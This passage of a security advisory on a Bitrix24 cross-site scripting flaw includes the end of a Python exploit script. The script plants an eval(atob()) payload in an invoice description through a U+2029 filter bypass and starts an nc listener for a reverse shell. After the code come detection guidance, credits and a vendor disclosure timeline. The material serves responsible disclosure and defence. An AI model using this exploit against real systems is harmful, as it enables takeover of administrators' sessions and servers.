</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SECONDARY_ENTITY_IDS&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;REQUISITE_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;BANK_DETAIL_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PAY_SYSTEM_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;UF_MYCOMPANY_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;MC_REQUISITE_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;MC_BANK_DETAIL_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[PERIOD]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[DAILY_INTERVAL_DAY]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[DAILY_WORKDAY_ONLY]&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[WEEKLY_INTERVAL_WEEK]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[WEEKLY_WEEK_DAYS][]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_INTERVAL_DAY]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_WORKDAY_ONLY]&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_MONTH_NUM_1]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_WEEKDAY_NUM]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_WEEK_DAY]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[MONTHLY_MONTH_NUM_2]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_INTERVAL_DAY]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_WORKDAY_ONLY]&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_MONTH_NUM_1]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_WEEK_DAY_NUM]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_WEEK_DAY]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[YEARLY_MONTH_NUM_2]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[START_DATE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[REPEAT_TILL]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[END_DATE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[LIMIT_REPEAT]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[DATE_PAY_BEFORE_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[DATE_PAY_BEFORE_COUNT]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[DATE_PAY_BEFORE_PERIOD]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;RECUR_PARAM[RECURRING_EMAIL_ID]&#34;</span><span class="p">:</span> <span class="s2">&#34;22&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;COMMENTS&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;USER_DESCRIPTION&#34;</span><span class="p">:</span> <span class="sa">b</span><span class="s2">&#34;&lt;img src=x onerror</span><span class="se">\xe2\x80\xa9</span><span class="s2">=eval(atob(&#39;&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;&#39;))&gt;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;INVOICE_PRODUCT_DATA&#34;</span><span class="p">:</span> <span class="s2">&#34;[{</span><span class="se">\&#34;</span><span class="s2">ID</span><span class="se">\&#34;</span><span class="s2">:0,</span><span class="se">\&#34;</span><span class="s2">PRODUCT_NAME</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">Bitrix Site Manager</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">PRODUCT_ID</span><span class="se">\&#34;</span><span class="s2">:23,</span><span class="se">\&#34;</span><span class="s2">QUANTITY</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">1.0000</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">MEASURE_CODE</span><span class="se">\&#34;</span><span class="s2">:796,</span><span class="se">\&#34;</span><span class="s2">MEASURE_NAME</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">pcs.</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">PRICE</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">PRICE_EXCLUSIVE</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">PRICE_NETTO</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">PRICE_BRUTTO</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">DISCOUNT_TYPE_ID</span><span class="se">\&#34;</span><span class="s2">:1,</span><span class="se">\&#34;</span><span class="s2">DISCOUNT_RATE</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">DISCOUNT_SUM</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">TAX_RATE</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">0.00</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">TAX_INCLUDED</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">N</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">CUSTOMIZED</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">Y</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">SORT</span><span class="se">\&#34;</span><span class="s2">:10}]&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;INVOICE_PRODUCT_DATA_SETTINGS&#34;</span><span class="p">:</span> <span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">ENABLE_DISCOUNT</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">N</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">ENABLE_TAX</span><span class="se">\&#34;</span><span class="s2">: </span><span class="se">\&#34;</span><span class="s2">N</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;saveAndView&#34;</span><span class="p">:</span> <span class="s2">&#34;Save&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;invoice_id&#34;</span><span class="p">:</span> <span class="n">TARGET_INVOICE_ID</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Edited invoice </span><span class="si">{</span><span class="n">TARGET_INVOICE_ID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXY</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit_invoice</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Visit this URL as admin to execute attack: </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/crm/invoice/edit/</span><span class="si">{</span><span class="n">TARGET_INVOICE_ID</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Waiting for reverse shell connection&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;nc&#34;</span><span class="p">,</span> <span class="s2">&#34;-nvlp&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)])</span>
</span></span></code></pre></div><h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited when the attacker has access to the CRM feature and permission to create and export contacts. This level of access may be granted if the user is in the management board group.</p>
<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the byte string <code>\xe2\x80\xa9</code> in request bodies. The presence of this string together with other characters like <code>&lt;</code> and <code>=</code> indicate possible exploitation of this vulnerability.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#8be2e5ede4cbe9e2fff9e2f3a5e8e4e6"><span class="__cf_email__" data-cfemail="c9a0a7afa689aba0bdbba0b1e7aaa6a4">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#6801060e0728590b450a011c1a0110461a1d"><span class="__cf_email__" data-cfemail="3e575058517e0f5d135c574a4c5746104c4b">[email&#160;protected]</span></a></li>
<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#375e5951587706541a555e43455e4f194542"><span class="__cf_email__" data-cfemail="177e7971785726743a757e63657e6f396562">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#3d54535b527d5f54494f5445135e5250"><span class="__cf_email__" data-cfemail="dfb6b1b9b09fbdb6abadb6a7f1bcb0b2">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-1714/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1717/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
